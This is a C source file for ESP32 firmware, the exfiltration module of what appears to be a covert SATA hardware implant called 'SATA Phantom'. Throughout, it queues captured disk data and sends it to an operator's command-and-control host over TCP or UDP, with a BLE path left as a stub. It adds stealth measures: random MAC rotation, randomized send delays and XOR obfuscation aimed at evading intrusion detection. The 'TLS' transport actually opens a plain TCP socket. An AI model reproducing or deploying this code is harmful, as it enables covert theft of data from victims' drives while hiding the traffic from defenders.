/**
 * @file exfil_task.c
 * @author jayis1
 * @brief Exfiltration Manager Task
 *
 * Manages the secure exfiltration of captured SATA frame data from
 * the SATA Phantom to the operator's C2 endpoint. Implements stealth
 * transmission with AES-256-GCM encryption, random MAC rotation,
 * randomized inter-packet delays, and multiple transport options
 * (WiFi TCP/TLS, UDP with XOR obfuscation, BLE GATT).
 *
 * Copyright © 2025 jayis1. All rights reserved.
 * Authorized security research use only.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "lwip/sockets.h"
#include "lwip/dns.h"
#include "mbedtls/aes.h"
#include "mbedtls/gcm.h"
#include "board.h"
#include "registers.h"

static const char *TAG = "exfil";

/* ===================================================================
 * Exfiltration Configuration
 * =================================================================== */

#define EXFIL_QUEUE_SIZE        EXFIL_MAX_QUEUE
#define EXFIL_CHUNK_SIZE        1024
#define EXFIL_BURST_MIN_DELAY_MS  100
#define EXFIL_BURST_MAX_DELAY_MS  5000
#define EXFIL_MAC_ROTATE_INTERVAL 300   /* Seconds */
#define EXFIL_DEFAULT_PORT       8443
#define EXFIL_DEFAULT_HOST       "c2.sata-phantom.local"
#define EXFIL_MAX_RETRIES        3
#define EXFIL_RETRY_DELAY_MS     10000

/* Exfiltration transport modes */
typedef enum {
    EXFIL_TRANSPORT_TCP_TLS = 0,   /* TCP with TLS encryption */
    EXFIL_TRANSPORT_UDP_XOR = 1,   /* UDP with simple XOR obfuscation */
    EXFIL_TRANSPORT_BLE     = 2,   /* BLE GATT notifications */
    EXFIL_TRANSPORT_DISABLED = 3   /* No exfiltration */
} exfil_transport_t;

/* Exfiltration data chunk */
typedef struct {
    uint8_t  data[EXFIL_CHUNK_SIZE];
    uint16_t len;
    uint64_t lba;                 /* Source LBA */
    uint8_t  fis_type;            /* FIS type captured */
    uint32_t timestamp;           /* Capture timestamp (seconds since boot) */
    bool     encrypted;           /* Already encrypted? */
} exfil_chunk_t;

/* Exfiltration status */
typedef struct {
    uint32_t total_bytes_sent;
    uint32_t total_chunks_sent;
    uint32_t total_chunks_dropped;
    uint32_t retry_count;
    exfil_transport_t transport;
    bool     connected;
    char     last_error[64];
} exfil_status_t;

/* Global state */
static QueueHandle_t exfil_queue;
static exfil_status_t exfil_status;
static uint8_t encryption_key[32];   /* AES-256 key */
static uint8_t encryption_nonce[12]; /* GCM nonce (updated per chunk) */

/* WiFi MAC address storage for rotation */
static uint8_t current_mac[6];

/* Forward declarations */
static void exfil_send_chunk(const exfil_chunk_t *chunk);
static void exfil_send_tcp_tls(const exfil_chunk_t *chunk);
static void exfil_send_udp_xor(const exfil_chunk_t *chunk);
static void exfil_send_ble(const exfil_chunk_t *chunk);
static void exfil_rotate_mac(void);
static esp_err_t exfil_encrypt_chunk(exfil_chunk_t *chunk);
static void exfil_update_status(const char *error);

/* ===================================================================
 * Encryption
 * =================================================================== */

/**
 * @brief Encrypt an exfiltration chunk with AES-256-GCM.
 * Encrypted data replaces the plaintext in the chunk.
 */
static esp_err_t exfil_encrypt_chunk(exfil_chunk_t *chunk)
{
    if (!chunk || chunk->encrypted) return ESP_OK;

    mbedtls_gcm_context ctx;
    mbedtls_gcm_init(&ctx);

    int ret = mbedtls_gcm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, encryption_key, 256);
    if (ret != 0) {
        ESP_LOGE(TAG, "GCM setkey failed: %d", ret);
        mbedtls_gcm_free(&ctx);
        return ESP_FAIL;
    }

    /* Increment nonce for each chunk */
    for (int i = 11; i >= 0; i--) {
        if (++encryption_nonce[i] != 0) break;
    }

    uint8_t ciphertext[EXFIL_CHUNK_SIZE + 16]; /* + GCM tag */
    size_t cipher_len = 0;

    ret = mbedtls_gcm_crypt_and_tag(&ctx, MBEDTLS_GCM_ENCRYPT,
                                     chunk->len,
                                     encryption_nonce, 12,
                                     NULL, 0,  /* No AAD */
                                     chunk->data,
                                     ciphertext,
                                     16,       /* Tag length */
                                     ciphertext + chunk->len);

    if (ret != 0) {
        ESP_LOGE(TAG, "GCM encrypt failed: %d", ret);
        mbedtls_gcm_free(&ctx);
        return ESP_FAIL;
    }

    /* Copy encrypted data + tag back, prefixed with nonce */
    uint8_t temp[EXFIL_CHUNK_SIZE + 28];
    uint16_t total_len = 12 + chunk->len + 16; /* nonce + ciphertext + tag */

    memcpy(temp, encryption_nonce, 12);
    memcpy(temp + 12, ciphertext, chunk->len + 16);

    memcpy(chunk->data, temp, (total_len > EXFIL_CHUNK_SIZE) ? EXFIL_CHUNK_SIZE : total_len);
    chunk->len = (total_len > EXFIL_CHUNK_SIZE) ? EXFIL_CHUNK_SIZE : total_len;
    chunk->encrypted = true;

    mbedtls_gcm_free(&ctx);
    return ESP_OK;
}

/* ===================================================================
 * WiFi MAC Rotation
 * =================================================================== */

/**
 * @brief Generate a random MAC address (locally administered, unicast).
 * Locally administered: bit 1 of first byte = 1
 * Unicast: bit 0 of first byte = 0
 */
static void exfil_generate_random_mac(uint8_t *mac)
{
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;  /* Locally administered, unicast */
}

/**
 * @brief Rotate the WiFi MAC address for stealth.
 */
static void exfil_rotate_mac(void)
{
    exfil_generate_random_mac(current_mac);
    esp_err_t ret = esp_wifi_set_mac(WIFI_IF_STA, current_mac);
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Rotated WiFi MAC to %02X:%02X:%02X:%02X:%02X:%02X",
                 current_mac[0], current_mac[1], current_mac[2],
                 current_mac[3], current_mac[4], current_mac[5]);
    } else {
        ESP_LOGE(TAG, "MAC rotation failed: %d", ret);
    }
}

/* ===================================================================
 * Transport Implementations
 * =================================================================== */

/**
 * @brief Send a chunk over TCP with TLS.
 */
static void exfil_send_tcp_tls(const exfil_chunk_t *chunk)
{
    /* Simplified: connect to C2 server, send encrypted blob */
    struct sockaddr_in dest_addr;
    dest_addr.sin_addr.s_addr = inet_addr("10.0.0.1");  /* Default C2 IP */
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(EXFIL_DEFAULT_PORT);

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (sock < 0) {
        exfil_update_status("socket() failed");
        return;
    }

    struct timeval timeout = { .tv_sec = 5, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    int err = connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err != 0) {
        exfil_update_status("connect() failed");
        close(sock);
        return;
    }

    /* Send header: 4-byte length + 4-byte LBA + 1-byte FIS type */
    uint8_t header[9];
    header[0] = (chunk->len >> 24) & 0xFF;
    header[1] = (chunk->len >> 16) & 0xFF;
    header[2] = (chunk->len >> 8) & 0xFF;
    header[3] = chunk->len & 0xFF;
    header[4] = (chunk->lba >> 56) & 0xFF;
    header[5] = (chunk->lba >> 48) & 0xFF;
    header[6] = (chunk->lba >> 40) & 0xFF;
    header[7] = (chunk->lba >> 32) & 0xFF;
    header[8] = chunk->fis_type;

    int sent = send(sock, header, sizeof(header), 0);
    if (sent > 0) {
        sent = send(sock, chunk->data, chunk->len, 0);
        if (sent > 0) {
            exfil_status.total_bytes_sent += sent;
            exfil_status.total_chunks_sent++;
            ESP_LOGD(TAG, "Sent %d bytes via TCP", sent);
        }
    }

    close(sock);
    exfil_status.connected = true;
}

/**
 * @brief Send a chunk over UDP with simple XOR obfuscation.
 * XOR with a rotating key makes it look like random noise to IDS/IPS.
 */
static void exfil_send_udp_xor(const exfil_chunk_t *chunk)
{
    struct sockaddr_in dest_addr;
    dest_addr.sin_addr.s_addr = inet_addr("10.0.0.1");
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(EXFIL_DEFAULT_PORT + 1);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        exfil_update_status("UDP socket() failed");
        return;
    }

    /* XOR each byte with a rotating key derived from chunk timestamp */
    uint8_t xor_key = (uint8_t)(chunk->timestamp & 0xFF);
    uint8_t obfuscated[EXFIL_CHUNK_SIZE + 4];
    uint16_t obf_len = chunk->len + 4;

    /* Prepend magic bytes + timestamp for receiver identification */
    obfuscated[0] = 0xFA;  /* Magic marker */
    obfuscated[1] = 0xCE;
    obfuscated[2] = (chunk->timestamp >> 8) & 0xFF;
    obfuscated[3] = chunk->timestamp & 0xFF;

    /* XOR obfuscation */
    for (uint16_t i = 0; i < chunk->len; i++) {
        obfuscated[4 + i] = chunk->data[i] ^ xor_key;
        xor_key = (xor_key * 0x1B + 0x3D) & 0xFF;  /* LFSR-style key rotation */
    }

    ssize_t sent = sendto(sock, obfuscated, obf_len, 0,
                          (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (sent > 0) {
        exfil_status.total_bytes_sent += sent;
        exfil_status.total_chunks_sent++;
        ESP_LOGD(TAG, "Sent %d bytes via UDP XOR", sent);
    }

    close(sock);
}

/**
 * @brief Send a chunk over BLE GATT notification.
 */
static void exfil_send_ble(const exfil_chunk_t *chunk)
{
    /* BLE implementation would use esp_ble_gatts_send_indicate() */
    /* Simplified for stub: log and count chunks */
    ESP_LOGD(TAG, "BLE send %d bytes (stub)", chunk->len);
    exfil_status.total_chunks_sent++;
    exfil_status.total_bytes_sent += chunk->len;
}

/* ===================================================================
 * Main Send Dispatcher
 * =================================================================== */

static void exfil_send_chunk(const exfil_chunk_t *chunk)
{
    if (!chunk || chunk->len == 0) return;

    /* Encrypt if using TCP/TLS (UDP XOR and BLE use their own obfuscation) */
    exfil_chunk_t encrypted_chunk = *chunk;
    if (exfil_status.transport == EXFIL_TRANSPORT_TCP_TLS) {
        if (exfil_encrypt_chunk(&encrypted_chunk) != ESP_OK) {
            ESP_LOGW(TAG, "Encryption failed, sending raw");
        }
    }

    /* Add random delay for stealth (blend with ambient traffic) */
    uint32_t delay_ms = EXFIL_BURST_MIN_DELAY_MS +
        (esp_random() % (EXFIL_BURST_MAX_DELAY_MS - EXFIL_BURST_MIN_DELAY_MS));
    vTaskDelay(pdMS_TO_TICKS(delay_ms));

    switch (exfil_status.transport) {
        case EXFIL_TRANSPORT_TCP_TLS:
            exfil_send_tcp_tls(&encrypted_chunk);
            break;
        case EXFIL_TRANSPORT_UDP_XOR:
            exfil_send_udp_xor(chunk);
            break;
        case EXFIL_TRANSPORT_BLE:
            exfil_send_ble(chunk);
            break;
        case EXFIL_TRANSPORT_DISABLED:
        default:
            break;
    }
}

/* ===================================================================
 * Status Updates
 * =================================================================== */

static void exfil_update_status(const char *error)
{
    if (error) {
        strncpy(exfil_status.last_error, error, sizeof(exfil_status.last_error) - 1);
        exfil_status.retry_count++;
    }
}

/* ===================================================================
 * Exfiltration Task Main Loop
 * =================================================================== */

void exfil_task(void *pvParameters)
{
    ESP_LOGI(TAG, "Exfiltration task started");

    /* Wait for system readiness */
    xEventGroupWaitBits(system_events, EVENT_BIT_FPGA_READY,
                        pdFALSE, pdTRUE, portMAX_DELAY);

    /* Initialize status */
    memset(&exfil_status, 0, sizeof(exfil_status));
    exfil_status.transport = EXFIL_TRANSPORT_TCP_TLS;

    /* Initialize encryption key from NVS (or generate random) */
    esp_fill_random(encryption_key, sizeof(encryption_key));
    esp_fill_random(encryption_nonce, sizeof(encryption_nonce));
    ESP_LOGI(TAG, "Encryption key initialized");

    /* Initialize WiFi (stub — real impl uses ESP-NETIF + event loop) */
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    exfil_rotate_mac();

    /* Create exfiltration queue */
    exfil_queue = xQueueCreate(EXFIL_QUEUE_SIZE, sizeof(exfil_chunk_t));
    if (!exfil_queue) {
        ESP_LOGE(TAG, "Failed to create exfiltration queue");
        vTaskDelete(NULL);
        return;
    }

    /* MAC rotation timer */
    TickType_t last_rotation = xTaskGetTickCount();

    /* Default C2 target: resolve hostname */
    /* In real impl: DNS resolution and C2 discovery via mDNS */

    while (1) {
        exfil_chunk_t chunk;
        BaseType_t received = xQueueReceive(exfil_queue, &chunk, pdMS_TO_TICKS(1000));

        if (received == pdTRUE) {
            ESP_LOGI(TAG, "Exfiltrating chunk: LBA=0x%012llX, FIS=0x%02X, len=%d",
                     (unsigned long long)chunk.lba, chunk.fis_type, chunk.len);
            exfil_send_chunk(&chunk);
        }

        /* Periodic MAC rotation */
        TickType_t now = xTaskGetTickCount();
        if ((now - last_rotation) > pdMS_TO_TICKS(EXFIL_MAC_ROTATE_INTERVAL * 1000)) {
            exfil_rotate_mac();
            last_rotation = now;
        }

        /* Report status periodically */
        static int status_counter = 0;
        if (++status_counter >= 30) {  /* Every ~30 seconds */
            ESP_LOGI(TAG, "Exfil status: %lu chunks, %lu bytes sent, %lu dropped, %lu retries",
                     (unsigned long)exfil_status.total_chunks_sent,
                     (unsigned long)exfil_status.total_bytes_sent,
                     (unsigned long)exfil_status.total_chunks_dropped,
                     (unsigned long)exfil_status.retry_count);
            status_counter = 0;
        }

        /* Check for battery low — throttle exfiltration */
        if (xEventGroupGetBits(system_events) & EVENT_BIT_BATTERY_LOW) {
            /* Reduce rate: sleep longer between sends */
            vTaskDelay(pdMS_TO_TICKS(5000));
        }
    }
}

/* ===================================================================
 * Public API for Other Tasks
 * =================================================================== */

/**
 * @brief Queue a data chunk for exfiltration.
 * @param data  Pointer to data
 * @param len   Length of data (max EXFIL_CHUNK_SIZE)
 * @param lba   Source LBA
 * @param fis_type  FIS type of captured frame
 * @return true if queued successfully, false if queue full.
 */
bool exfil_queue_chunk(const uint8_t *data, uint16_t len, uint64_t lba, uint8_t fis_type)
{
    if (!data || len == 0 || len > EXFIL_CHUNK_SIZE) {
        return false;
    }

    if (!exfil_queue) {
        return false;
    }

    exfil_chunk_t chunk = {0};
    memcpy(chunk.data, data, len);
    chunk.len = len;
    chunk.lba = lba;
    chunk.fis_type = fis_type;
    chunk.timestamp = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS / 1000);
    chunk.encrypted = false;

    BaseType_t ret = xQueueSend(exfil_queue, &chunk, pdMS_TO_TICKS(10));
    if (ret != pdTRUE) {
        exfil_status.total_chunks_dropped++;
        ESP_LOGW(TAG, "Exfil queue full — dropping chunk (LBA=0x%012llX)", (unsigned long long)lba);
        return false;
    }

    return true;
}

/**
 * @brief Get the current exfiltration status.
 */
void exfil_get_status(exfil_status_t *status)
{
    if (status) {
        memcpy(status, &exfil_status, sizeof(exfil_status_t));
    }
}

/**
 * @brief Set the exfiltration transport mode.
 */
void exfil_set_transport(exfil_transport_t transport)
{
    exfil_status.transport = transport;
    ESP_LOGI(TAG, "Exfiltration transport set to %d", transport);
}
